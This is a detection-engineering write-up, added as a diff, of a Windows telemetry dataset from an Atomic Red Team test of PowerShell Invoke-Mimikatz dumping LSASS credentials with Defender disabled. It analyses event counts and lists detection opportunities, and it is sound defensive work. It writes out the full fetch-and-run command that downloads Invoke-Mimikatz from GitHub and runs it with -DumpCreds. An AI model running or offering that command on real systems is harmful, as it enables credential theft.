@@ -1,0 +1,47 @@
+# T1003.001-10: LSASS Memory — Powershell Mimikatz
+
+## Technique Context
+
+PowerShell-based Mimikatz — most commonly the `Invoke-Mimikatz` function from PowerSploit — represents the fileless evolution of the classic credential dumping toolkit. Rather than dropping a `mimikatz.exe` binary to disk, the attacker downloads and executes the PowerShell implementation directly in memory using `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1')`. This pattern was developed specifically to evade signature-based detection that focused on the mimikatz.exe binary hash, and it became a staple technique for red teams and threat actors alike throughout the mid-2010s.
+
+The detection community has adapted substantially. PowerShell script block logging (EID 4104) captures the plaintext content of every script block executed, meaning that if the download and execution succeed, the `Invoke-Mimikatz` function body and its `sekurlsa::logonpasswords` invocation are written verbatim to the event log. AMSI (Antimalware Scan Interface) integration in PowerShell 5.1+ means that even in-memory execution passes through the AV engine before running. Sysmon EID 3 (Network Connection) can capture the outbound HTTPS connection to raw.githubusercontent.com. The combination of these detections has made this specific variant highly detectable in environments with modern logging.
+
+This undefended dataset captures the execution with Defender disabled, meaning AMSI is not blocking the script content. The key question is whether the network request succeeded and whether `Invoke-Mimikatz` actually ran against LSASS.
+
+## What This Dataset Contains
+
+This dataset is notably larger than the defended version, with 4,520 PowerShell events versus 41 in the defended run — a more than 100x increase. The channel breakdown is 4,293 EID 4103 (Module Pipeline Output) and 227 EID 4104 (Script Block Text) events. This volume is the strongest indicator that `Invoke-Mimikatz` executed: the defended version's PowerShell channel contained only test framework boilerplate because Defender blocked execution before the script ran; this undefended run's massive EID 4103 output reflects the verbose pipeline output produced by `Invoke-Mimikatz` as it enumerates SSP providers, attempts privilege escalation, and outputs credential structures.
+
+The **Sysmon channel** shows 7,383 total events (7,354 EID 11, 17 EID 7, 4 EID 1, 4 EID 10, 2 EID 17, 1 EID 3, 1 EID 22). The single Sysmon EID 3 (Network Connection) event is significant — it captures the outbound connection that delivered the Invoke-Mimikatz script from GitHub. The single EID 22 (DNS Query) event likely captured the DNS resolution for `raw.githubusercontent.com`. The 17 EID 7 image load events include DLLs loaded during Mimikatz's credential extraction operations. Unlike the defended version, which showed Windows Defender DLLs being loaded as the blocking mechanism, the undefended run's image loads reflect PowerShell and .NET components loading during actual script execution.
+
+The **Security channel** (4 EID 4688 events) is smaller than the defended version's 10 events. It records `whoami.exe` (PID 0x880) and `powershell.exe` (PID 0x139c) process creations, plus a second set of `whoami.exe` (PID 0x990) and `powershell.exe` (PID 0xe0c) for the cleanup phase.
+
+The defended analysis noted: `"powershell.exe" & {IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds}` as the command line visible in EID 4688. That same command line is present in this dataset's Security channel.
+
+The massive PowerShell EID 4103 count represents the credential extraction output and the verbose reporting from `Invoke-Mimikatz`'s LSASS enumeration. This includes provider enumeration output, wdigest credential structures, and the formatted credential dump output that Mimikatz prints to the console.
+
+## What This Dataset Does Not Contain
+
+The 20-event Sysmon sample is entirely drawn from EID 11 Windows Update writes, so the EID 3 network connection and EID 22 DNS events are not visible in the sample. Analysts querying this dataset should filter specifically for EID 3 and EID 22 to find the GitHub connection.
+
+Sysmon EID 10 (Process Access) targeting `lsass.exe` is absent from the EID breakdown — this is somewhat unexpected for a successful Invoke-Mimikatz run. PowerShell-based Mimikatz uses reflective DLL injection techniques that may bypass the standard `OpenProcess` API call that Sysmon monitors. The technique may have extracted credentials through in-process memory reads rather than the classic `NtReadVirtualMemory` call that generates EID 10 events. Alternatively, the sysmon-modular configuration's include-mode filtering may have excluded the specific access patterns generated by reflective injection.
+
+There are no Sysmon EID 11 events for a dump file — PowerShell Mimikatz typically outputs credentials to the console or a variable rather than writing a `.dmp` file to disk.
+
+## Assessment
+
+This is one of the most valuable datasets in the T1003.001 collection because it captures what a successful in-memory Mimikatz execution looks like end-to-end. The 4,520 PowerShell events represent the actual credential enumeration output — something the defended version explicitly lacked. The Sysmon EID 3 network connection to GitHub and the EID 22 DNS query provide early-stage detection opportunities before any credential access occurs. For detection engineering focused on PowerShell-based credential theft, this dataset provides ground truth for the distinctive logging patterns produced by a successful `Invoke-Mimikatz -DumpCreds` execution in a domain environment.
+
+## Detection Opportunities Present in This Data
+
+1. Sysmon EID 22 (DNS Query) with `QueryName` resolving `raw.githubusercontent.com` from a `powershell.exe` process — particularly when the parent process is the ART test framework or another suspicious context.
+
+2. Sysmon EID 3 (Network Connection) from `powershell.exe` to `raw.githubusercontent.com:443` — the outbound download of the Invoke-Mimikatz script, captured before any credential access occurs.
+
+3. PowerShell EID 4104 containing the string `Invoke-Mimikatz` or `IEX` combined with a `DownloadString` call to a GitHub raw content URL — this fires at the moment the script is loaded into the PowerShell engine.
+
+4. Security EID 4688 with command line containing the specific PowerShell IEX download pattern against PowerSploit's repository path — high specificity for this particular test variant.
+
+5. The volume of PowerShell EID 4103 events in a short time window (4,293 in a single test execution) is itself anomalous. A burst of module pipeline output events from a single `powershell.exe` process within seconds is characteristic of large-scale enumeration or credential parsing operations.
+
+6. Sysmon EID 7 image loads in `powershell.exe` that include credential-access-relevant DLLs (`samlib.dll`, `lsasrv.dll`, `wdigest.dll`, `kerberos.dll`) during a short execution window — Mimikatz loads these DLLs to access their exported functions for credential extraction.
